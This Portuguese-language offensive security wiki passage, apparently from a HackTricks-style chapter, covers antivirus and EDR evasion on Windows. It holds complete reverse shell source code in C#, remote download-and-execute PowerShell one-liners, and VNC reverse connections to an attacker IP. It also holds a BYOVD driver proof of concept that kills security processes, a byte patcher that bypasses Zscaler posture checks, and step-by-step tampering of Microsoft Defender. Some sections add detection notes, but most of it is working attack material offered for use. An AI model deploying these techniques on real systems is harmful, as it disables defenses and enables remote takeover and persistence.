[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) é uma ferramenta que empacota payloads em contêineres de saída para evadir o Mark-of-the-Web.

Exemplo de uso:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Aqui está uma demo para burlar o SmartScreen empacotando payloads dentro de arquivos ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) é um poderoso mecanismo de logging no Windows que permite que aplicações e componentes do sistema **registrem eventos**. No entanto, ele também pode ser usado por produtos de segurança para monitorar e detectar atividades maliciosas.

Semelhante a como AMSI é desabilitado (bypass) também é possível fazer com que a função **`EtwEventWrite`** do processo em user space retorne imediatamente sem registrar nenhum evento. Isso é feito patchando a função na memória para retornar imediatamente, efetivamente desabilitando o logging do ETW para esse processo.

Você pode encontrar mais informações em **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Carregar binários C# na memória é algo conhecido há bastante tempo e ainda é uma ótima forma de executar suas ferramentas de post-exploitation sem ser pego pelo AV.

Como o payload será carregado diretamente na memória sem tocar no disco, só precisamos nos preocupar em patchar o AMSI para todo o processo.

A maioria dos frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) já oferece a capacidade de executar assemblies C# diretamente na memória, mas há diferentes formas de fazer isso:

- **Fork\&Run**

Envolve **spawnar um novo processo sacrificial**, injetar seu código malicioso de post-exploitation nesse novo processo, executar seu código malicioso e, ao terminar, matar o novo processo. Isso tem seus benefícios e suas desvantagens. O benefício do método fork and run é que a execução ocorre **fora** do processo do nosso Beacon implantado. Isso significa que, se algo na nossa ação de post-exploitation der errado ou for detectado, há uma **chance muito maior** de nosso **implant sobrevivir.** A desvantagem é que há uma **chance maior** de ser pego por **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Trata-se de injetar o código malicioso de post-exploitation **no próprio processo**. Dessa forma, você evita ter que criar um novo processo e fazê-lo ser escaneado pelo AV, mas a desvantagem é que, se algo der errado na execução do seu payload, há uma **chance muito maior** de **perder seu beacon** porque ele pode travar.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se você quiser ler mais sobre carregamento de C# Assembly, confira este artigo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e seu BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Você também pode carregar C# Assemblies **a partir do PowerShell**, confira [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e [o vídeo de S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Como proposto em [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), é possível executar código malicioso usando outras linguagens ao dar à máquina comprometida acesso **ao ambiente do interpretador instalado no compartilhamento SMB controlado pelo Attacker**.

Ao permitir acesso aos Interpreter Binaries e ao ambiente no compartilhamento SMB, você pode **executar código arbitrário nessas linguagens dentro da memória** da máquina comprometida.

O repo indica: Defender ainda escaneia os scripts, mas ao utilizar Go, Java, PHP etc temos **mais flexibilidade para contornar assinaturas estáticas**. Testes com scripts de reverse shell aleatórios e sem ofuscação nessas linguagens provaram ser bem-sucedidos.

## TokenStomping

Token stomping é uma técnica que permite a um atacante **manipular o access token ou um produto de segurança como um EDR ou AV**, permitindo reduzir seus privilégios para que o processo não morra, mas também não tenha permissões para verificar atividades maliciosas.

Para evitar isso, o Windows poderia **impedir processos externos** de obter handles sobre os tokens de processos de segurança.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Como descrito em [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), é fácil simplesmente implantar o Chrome Remote Desktop em um PC de vítima e então usá-lo para assumi-lo e manter persistência:
1. Baixe de https://remotedesktop.google.com/, clique em "Set up via SSH" e depois clique no arquivo MSI para Windows para baixar o arquivo MSI.
2. Execute o instalador silenciosamente na vítima (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Volte para a página do Chrome Remote Desktop e clique em next. O assistente então pedirá autorização; clique no botão Authorize para continuar.
4. Execute o parâmetro fornecido com alguns ajustes: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Note o parâmetro pin, que permite definir o pin sem usar a GUI).


## Advanced Evasion

Evasion é um tema muito complicado, às vezes você precisa levar em conta muitas fontes diferentes de telemetria em apenas um sistema, então é praticamente impossível permanecer completamente indetectado em ambientes maduros.

Todo ambiente contra o qual você atuar terá seus próprios pontos fortes e fracos.

Eu recomendo fortemente que você assista a esta palestra de [@ATTL4S](https://twitter.com/DaniLJ94), para obter um ponto de entrada em técnicas mais avançadas de Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

esta também é outra ótima palestra de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Você pode usar [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) que irá **remover partes do binário** até **descobrir qual parte o Defender** está identificando como maliciosa e separá-la para você.\
Outra ferramenta que faz a **mesma coisa é** [**avred**](https://github.com/dobin/avred) com uma interface web aberta oferecendo o serviço em [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Até o Windows10, todos os Windows vinham com um **Telnet server** que você podia instalar (como administrador) fazendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Faça com que ele **inicie** quando o sistema for iniciado e **execute** agora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Alterar a porta telnet** (stealth) e desabilitar o firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Baixe em: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (você quer os downloads bin, não o setup)

**NO HOST**: Execute _**winvnc.exe**_ e configure o server:

- Ative a opção _Disable TrayIcon_
- Defina uma password em _VNC Password_
- Defina uma password em _View-Only Password_

Depois, mova o binário _**winvnc.exe**_ e o arquivo _**UltraVNC.ini**_ **criado recentemente** para dentro do **victim**

#### **Reverse connection**

O **attacker** deve **executar dentro** do seu **host** o binário `vncviewer.exe -listen 5900` para que ele esteja **preparado** para capturar uma reverse **VNC connection**. Depois, dentro do **victim**: Inicie o daemon winvnc `winvnc.exe -run` e execute `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Para manter a stealth você não deve fazer algumas coisas

- Não inicie `winvnc` se ele já estiver rodando, ou você vai disparar um [popup](https://i.imgur.com/1SROTTl.png). verifique se ele está rodando com `tasklist | findstr winvnc`
- Não inicie `winvnc` sem `UltraVNC.ini` no mesmo diretório, ou isso fará com que [the config window](https://i.imgur.com/rfMQWcf.png) seja aberta
- Não execute `winvnc -h` para ajuda, ou você vai disparar um [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Baixe em: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro de GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Agora **inicie o lister** com `msfconsole -r file.rc` e **execute** o **xml payload** com:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**O defensor atual encerrará o processo muito rapidamente.**

### Compilando nosso próprio reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primeiro Revershell em C#

Compile-o com:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Use-o com:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download e execução automáticos:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de obfuscators em C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Usando python para exemplos de build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Outras ferramentas
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Mais

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 aproveitou uma pequena utilidade de console conhecida como **Antivirus Terminator** para desativar proteções de endpoint antes de soltar o ransomware. A ferramenta traz seu **próprio driver vulnerável, mas *signed***, e o abusa para emitir operações privilegiadas de kernel que até serviços AV Protected-Process-Light (PPL) não conseguem bloquear.

Principais conclusões
1. **Signed driver**: O arquivo entregue em disco é `ServiceMouse.sys`, mas o binário é o driver assinado legitimamente `AToolsKrnl64.sys` do “System In-Depth Analysis Toolkit” da Antiy Labs. Como o driver possui uma assinatura válida da Microsoft, ele carrega mesmo quando Driver-Signature-Enforcement (DSE) está habilitado.
2. **Instalação do serviço**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
A primeira linha registra o driver como um **kernel service** e a segunda o inicia para que `\\.\ServiceMouse` se torne acessível a partir do user land.
3. **IOCTLs expostos pelo driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Encerrar um processo arbitrário por PID (usado para matar serviços Defender/EDR) |
| `0x990000D0` | Excluir um arquivo arbitrário em disco |
| `0x990001D0` | Descarregar o driver e remover o serviço |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Por que funciona**:  BYOVD ignora completamente as proteções de user-mode; código que executa no kernel pode abrir processos *protected*, encerrá-los ou adulterar objetos de kernel independentemente de PPL/PP, ELAM ou outros recursos de hardening.

Detection / Mitigation
•  Ative a lista de bloqueio de drivers vulneráveis da Microsoft (`HVCI`, `Smart App Control`) para que o Windows recuse carregar `AToolsKrnl64.sys`.
•  Monitore a criação de novos serviços de *kernel* e alerte quando um driver for carregado de um diretório gravável por todos ou não estiver presente na allow-list.
•  Observe handles de user-mode para objetos de dispositivo personalizados seguidos de chamadas `DeviceIoControl` suspeitas.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

O **Client Connector** da Zscaler aplica regras de posture do dispositivo localmente e depende do Windows RPC para comunicar os resultados a outros componentes. Duas escolhas de design fracas tornam possível um bypass completo:

1. A avaliação de posture acontece **inteiramente no client-side** (um boolean é enviado ao servidor).
2. Os endpoints internos de RPC apenas validam que o executável que se conecta é **signed by Zscaler** (via `WinVerifyTrust`).

Ao **patchar quatro binários signed em disco** ambos os mecanismos podem ser neutralizados:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Sempre retorna `1`, então toda verificação fica compliant |
| `ZSAService.exe` | Chamada indireta para `WinVerifyTrust` | NOP-ed ⇒ qualquer processo (até unsigned) pode se vincular aos pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Substituído por `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Verificações de integridade no tunnel | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Após substituir os arquivos originais e reiniciar a stack de serviços:

* **Todas** as verificações de postura exibem **verde/conforme**.
* Binários não assinados ou modificados podem abrir os endpoints RPC de named-pipe (por exemplo, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* O host comprometido ganha acesso irrestrito à rede interna definida pelas políticas da Zscaler.

Este estudo de caso demonstra como decisões de confiança puramente do lado do cliente e simples verificações de assinatura podem ser derrotadas com alguns patches de bytes.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) impõe uma hierarquia de signer/level para que apenas processos protegidos de nível igual ou superior possam alterar uns aos outros. Ofensivamente, se você conseguir iniciar legitimamente um binário habilitado para PPL e controlar seus argumentos, você pode transformar uma funcionalidade benigna (por exemplo, logging) em uma primitive de escrita limitada, apoiada por PPL, contra diretórios protegidos usados por AV/EDR.

O que faz um processo rodar como PPL
- O EXE alvo (e quaisquer DLLs carregadas) deve ser assinado com um EKU compatível com PPL.
- O processo deve ser criado com CreateProcess usando as flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Um protection level compatível deve ser solicitado e corresponder ao signer do binário (por exemplo, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` para signers anti-malware, `PROTECTION_LEVEL_WINDOWS` para signers do Windows). Níveis incorretos falharão na criação.

Veja também uma introdução mais ampla a PP/PPL e proteção do LSASS aqui:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Ferramentas de launcher
- Helper open-source: CreateProcessAsPPL (seleciona o protection level e encaminha argumentos para o EXE alvo):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Padrão de uso:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- O binário de sistema assinado `C:\Windows\System32\ClipUp.exe` se auto-inicia e aceita um parâmetro para gravar um arquivo de log em um caminho especificado pelo chamador.
- Quando iniciado como um processo PPL, a escrita do arquivo ocorre com suporte de PPL.
- O ClipUp não consegue analisar paths contendo espaços; use 8.3 short paths para apontar para locais normalmente protegidos.

8.3 short path helpers
- Listar short names: `dir /x` em cada diretório pai.
- Derivar short path no cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Inicie o LOLBIN compatível com PPL (ClipUp) com `CREATE_PROTECTED_PROCESS` usando um launcher (por exemplo, CreateProcessAsPPL).
2) Passe o argumento de log-path do ClipUp para forçar a criação de um arquivo em um diretório protegido do AV (por exemplo, Defender Platform). Use 8.3 short names se necessário.
3) Se o binário alvo normalmente estiver aberto/locked pelo AV أثناء execução (por exemplo, MsMpEng.exe), agende a escrita na inicialização antes de o AV começar, instalando um serviço de auto-start que execute de forma confiável mais cedo. Valide a ordem de boot com Process Monitor (boot logging).
4) Na reinicialização, a escrita com suporte de PPL acontece antes de o AV travar seus binários, corrompendo o arquivo alvo e impedindo a inicialização.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- Você não pode controlar o conteúdo que o ClipUp grava além da colocação; o primitive é mais adequado para corrupção do que para injeção precisa de conteúdo.
- Requer admin local/SYSTEM para instalar/iniciar um service e uma janela de reboot.
- O timing é crítico: o target não pode estar aberto; a execução no boot evita file locks.

Detections
- Criação de processo do `ClipUp.exe` com argumentos incomuns, especialmente com parent não padrão, perto do boot.
- Novos services configurados para auto-start de binaries suspeitos e iniciando consistentemente antes do Defender/AV. Investigue criação/modificação de service antes de falhas de startup do Defender.
- File integrity monitoring em binaries do Defender/diretórios Platform; criações/modificações inesperadas de arquivos por processos com protected-process flags.
- Telemetria ETW/EDR: procure processos criados com `CREATE_PROTECTED_PROCESS` e uso anômalo de nível PPL por binaries não-AV.

Mitigations
- WDAC/Code Integrity: restrinja quais signed binaries podem rodar como PPL e sob quais parents; bloqueie a invocação do ClipUp fora de contextos legítimos.
- Service hygiene: restrinja criação/modificação de services auto-start e monitore manipulação de start-order.
- Garanta que o tamper protection do Defender e as proteções de early-launch estejam ativados; investigue erros de startup que indiquem corrupção de binary.
- Considere desabilitar a geração de 8.3 short-name em volumes que hospedam ferramentas de segurança, se for compatível com seu ambiente (teste cuidadosamente).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

O Windows Defender escolhe a plataforma a partir da qual executa enumerando subfolders em:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Ele seleciona o subfolder com a maior string de versão lexicográfica (por exemplo, `4.18.25070.5-0`), e então inicia os processos do service do Defender a partir dali (atualizando os caminhos de service/registry conforme necessário). Essa seleção confia em entradas de diretório, incluindo directory reparse points (symlinks). Um administrator pode aproveitar isso para redirecionar o Defender para um path gravável pelo attacker e obter DLL sideloading ou disruption do service.

Preconditions
- Local Administrator (necessário para criar directories/symlinks sob a pasta Platform)
- Ability to reboot or trigger Defender platform re-selection (service restart on boot)
- Apenas built-in tools required (mklink)

Why it works
- O Defender bloqueia writes em suas próprias pastas, mas a seleção da plataforma confia em entradas de diretório e escolhe a versão lexicograficamente mais alta sem validar se o target resolve para um path protegido/confiável.

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crie um symlink de diretório de versão mais alta dentro de Platform apontando para sua pasta:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger de seleção (reinicialização recomendada):
```cmd
shutdown /r /t 0
```
4) Verifique se MsMpEng.exe (WinDefend) executa a partir do caminho redirecionado:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Você deve observar o novo caminho do processo em `C:\TMP\AV\` e a configuração/registro do serviço refletindo esse local.

Opções de pós-exploração
- DLL sideloading/code execution: Solte/substitua DLLs que o Defender carrega do diretório da aplicação para executar código nos processos do Defender. Veja a seção acima: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Remova o symlink da versão para que, na próxima inicialização, o caminho configurado não seja resolvido e o Defender falhe ao iniciar:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Note que esta técnica não fornece elevação de privilégio por si só; ela requer direitos de administrador.

## API/IAT Hooking + Call-Stack Spoofing com PIC (estilo Crystal Kit)

Red teams podem mover o runtime evasion para fora do C2 implant e colocá-lo no próprio módulo de destino, fazendo hook na sua Import Address Table (IAT) e redirecionando APIs selecionadas por meio de position‑independent code (PIC) controlado pelo atacante. Isso generaliza o evasion além da pequena superfície de API que muitos kits expõem (por exemplo, CreateProcessA) e estende as mesmas proteções a BOFs e DLLs de post‑exploitation.

Abordagem de alto nível
- Stage um blob PIC ao lado do módulo de destino usando um reflective loader (prependido ou companion). O PIC deve ser autossuficiente e position‑independent.
- À medida que a host DLL carrega, percorra seu IMAGE_IMPORT_DESCRIPTOR e faça patch nas entradas da IAT para imports alvo (por exemplo, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) para apontarem para wrappers PIC leves.
- Cada wrapper PIC executa evasions antes de fazer tail-call para o endereço real da API. Evasions típicos incluem:
- Memory mask/unmask ao redor da chamada (por exemplo, encrypt regiões do beacon, RWX→RX, mudar nomes/permissões de páginas) e depois restaurar após a chamada.
- Call-stack spoofing: construir uma stack benigna e transitar para a API alvo para que a análise de call-stack resolva para frames esperados.
- Para compatibilidade, exporte uma interface para que um Aggressor script (ou equivalente) possa registrar quais APIs devem receber hook para Beacon, BOFs e post-ex DLLs.

Por que IAT hooking aqui
- Funciona para qualquer código que use o import hooked, sem modificar o código da ferramenta ou depender do Beacon para proxy de APIs específicas.
- Cobre post-ex DLLs: fazer hook em LoadLibrary* permite interceptar carregamentos de módulos (por exemplo, System.Management.Automation.dll, clr.dll) e aplicar o mesmo masking/stack evasion às chamadas de API deles.
- Restaura o uso confiável de comandos post-ex de criação de process contra detecções baseadas em call-stack ao encapsular CreateProcessA/W.

Esboço mínimo de IAT hook (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notas
- Aplique o patch após relocations/ASLR e antes do primeiro uso do import. Reflective loaders como TitanLdr/AceLdr demonstram hooking durante o `DllMain` do módulo carregado.
- Mantenha wrappers pequenos e PIC-safe; resolva a API real via o valor original da IAT que você capturou antes do patching ou via `LdrGetProcedureAddress`.
- Use transições RW → RX para PIC e evite deixar páginas writable+executable.

Call‑stack spoofing stub
- PIC stubs estilo Draugr constroem uma fake call chain (return addresses para módulos benignos) e então pivotam para a API real.
- Isso contorna detecções que esperam stacks canônicos de Beacon/BOFs para APIs sensíveis.
- Combine com stack cutting / stack stitching para cair dentro de frames esperados antes do prologue da API.

Operational integration
- Prepend the reflective loader aos post-ex DLLs para que o PIC e os hooks sejam inicializados automaticamente quando o DLL for carregado.
- Use um Aggressor script para registrar APIs alvo, de modo que Beacon e BOFs se beneficiem transparentemente do mesmo caminho de evasão sem mudanças no código.

Detection/DFIR considerations
